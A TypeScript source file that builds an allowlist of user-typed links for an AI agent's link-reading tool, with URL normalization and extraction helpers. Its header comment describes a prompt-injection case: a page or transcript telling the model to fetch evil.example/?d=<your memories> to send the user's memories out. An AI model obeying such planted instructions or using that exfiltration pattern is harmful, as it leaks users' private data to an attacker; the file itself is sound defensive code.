/**
 * The links a user typed, which is `readLink`'s allowlist for "/verify <link>".
 * A page or transcript that tells the model to "read"
 * evil.example/?d=<your memories> names a link the user never sent, so the
 * request never leaves. Pure, so the logic suite pins it.
 */

/** A link's comparable form: scheme added, host lowercased, fragment dropped. */
export function normalizeLink(raw: string): string | null {
	try {
		const url = new URL(/^https?:\/\//i.test(raw) ? raw : `https://${raw}`);
		if (url.protocol !== "https:" && url.protocol !== "http:") return null;
		url.hash = "";
		url.hostname = url.hostname.replace(/\.$/, "");
		return url.href;
	} catch {
		return null;
	}
}

/** The web links in what the user typed, normalized; trailing punctuation is the sentence's. */
export function linksInText(text: string): string[] {
	const links: string[] = [];
	for (const match of text.matchAll(/(?:https?:\/\/|www\.)[^\s<>"')\]]+/gi)) {
		const link = normalizeLink(match[0].replace(/[.,!?;:]+$/, ""));
		if (link) links.push(link);
	}
	return links;
}
